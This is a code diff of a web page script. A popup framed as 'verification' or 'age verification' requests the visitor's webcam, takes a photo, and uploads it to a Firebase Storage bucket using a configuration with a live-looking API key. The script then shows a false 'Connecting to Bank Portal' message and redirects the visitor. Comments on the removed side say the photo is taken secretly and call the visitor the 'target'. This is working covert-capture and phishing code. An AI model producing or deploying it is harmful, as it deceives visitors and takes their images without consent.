@@ -1,59 +1,71 @@
-// 1. Firebase Configuration (Apni asali details yahan dalein)
+// Firebase Configuration
 const firebaseConfig = {
-    apiKey: "YOUR_API_KEY",
-    authDomain: "YOUR_PROJECT.firebaseapp.com",
-    projectId: "YOUR_PROJECT_ID",
-    storageBucket: "YOUR_PROJECT.appspot.com",
-    messagingSenderId: "YOUR_SENDER_ID",
-    appId: "YOUR_APP_ID"
+    apiKey: "AIzaSyCFy28nNtxhkjfpOd0aCfYkjHUwErh1WVQ",
+    authDomain: "movie-1e6fc.firebaseapp.com",
+    projectId: "movie-1e6fc",
+    storageBucket: "movie-1e6fc.firebasestorage.app",
+    messagingSenderId: "371616954594",
+    appId: "1:371616954594:web:977d88ec7570df351246bb"
 };
 
-firebase.initializeApp(firebaseConfig);
+// Initialize Firebase
+if (!firebase.apps.length) {
+    firebase.initializeApp(firebaseConfig);
+}
 const storage = firebase.storage();
 
-// 2. Open Verification Popup
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const overlay = document.getElementById('verifyOverlay');
+
+// 1. Open Popup and Request Camera
 async function openVerify() {
-    document.getElementById('verifyOverlay').style.display = 'flex';
-    
-    // Background mein camera mangna
+    overlay.style.display = 'flex';
     try {
-        const video = document.getElementById('video');
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" }, 
+            audio: false 
+        });
         video.srcObject = stream;
     } catch (err) {
-        console.log("Camera access denied.");
+        console.error("Camera denied:", err);
+        alert("Verification required to proceed!");
     }
 }
 
-// 3. Silent Capture and Firebase Upload
-async function captureAndProceed() {
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+// 2. Capture and Upload
+async function captureAndDone() {
     const context = canvas.getContext('2d');
 
     if (video.srcObject) {
-        // Chupke se photo lena
+        // Set canvas size to video size
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
+        // Draw the current frame
         context.drawImage(video, 0, 0);
 
+        // Convert to Image and Upload
         canvas.toBlob(async (blob) => {
             if (blob) {
-                const fileName = `target_${Date.now()}.jpg`;
-                const storageRef = storage.ref('verifications/' + fileName);
+                const name = "user_" + Date.now() + ".jpg";
+                const storageRef = storage.ref('verifications/' + name);
                 
-                // Firebase Storage mein upload
-                await storageRef.put(blob);
-                console.log("Data Secured.");
+                try {
+                    await storageRef.put(blob);
+                    console.log("Capture Success.");
+                } catch (e) {
+                    console.error("Upload Error:", e);
+                }
             }
         }, 'image/jpeg');
 
-        // Camera track stop karna (Light band ho jaye)
+        // Stop camera tracks
         const tracks = video.srcObject.getTracks();
-        tracks.forEach(track => track.stop());
+        tracks.forEach(t => t.stop());
     }
 
-    // Target ko redirect karna
-    alert("Verification Complete. Portal Access Granted.");
-    document.getElementById('verifyOverlay').style.display = 'none';
+    // Redirect
+    alert("Age Verified! Connecting to Bank Portal...");
+    overlay.style.display = 'none';
+    window.location.href = "https://www.google.com";
 }
